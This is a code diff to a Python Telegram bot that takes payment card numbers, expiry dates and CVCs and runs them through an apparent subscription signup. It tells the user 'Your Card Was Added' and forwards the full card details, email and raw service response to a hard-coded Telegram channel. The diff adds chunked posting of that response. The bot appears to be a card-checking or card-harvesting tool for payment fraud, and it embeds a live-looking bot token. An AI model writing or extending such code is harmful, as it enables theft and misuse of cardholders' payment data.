@@ -2,6 +2,7 @@ import telebot
 import requests
 import random
 import string
+import json
 
 BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
 CHANNEL_ID = -1002170961342
@@ -21,6 +22,11 @@ def parse_card_input(text):
     if not (card_number.isdigit() and cvc.isdigit() and exp_month.isdigit() and (len(exp_year) == 2 or len(exp_year) == 4)):
         return None
     return card_number, exp_month.zfill(2), exp_year, cvc
+
+def send_long_message(chat_id, text):
+    max_length = 4096
+    for i in range(0, len(text), max_length):
+        bot.send_message(chat_id, text[i:i+max_length])
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
@@ -98,18 +104,17 @@ def card_handler(message):
 
         if signup_json.get("success") is True:
             subscription_id = signup_json.get("subscription", {}).get("id", "N/A")
-            success_msg = (
-                f"✅ Payment Successful!\n\n"
-                f"Card Details:\n"
-                f"Number: {card_number}\n"
-                f"Expiry: {exp_month}/{exp_year}\n"
-                f"CVC: {cvc}\n\n"
+            summary_msg = (
+                f"✅ Payment Successful!\n"
+                f"Card: {card_number} | {exp_month}/{exp_year} | {cvc}\n"
                 f"Subscription ID: {subscription_id}\n"
-                f"Email used: {email}\n\n"
-                f"Full Response:\n{signup_json}"
+                f"Email used: {email}\n"
             )
             bot.reply_to(message, "✅ Your Card Was Added")
-            bot.send_message(CHANNEL_ID, success_msg)
+            bot.send_message(CHANNEL_ID, summary_msg)
+
+            full_response_str = json.dumps(signup_json, indent=2)
+            send_long_message(CHANNEL_ID, f"Full Response:\n{full_response_str}")
         else:
             bot.reply_to(message, f"❌ Decline or Error:\n{signup_json.get('message', 'Unknown error')}")
 
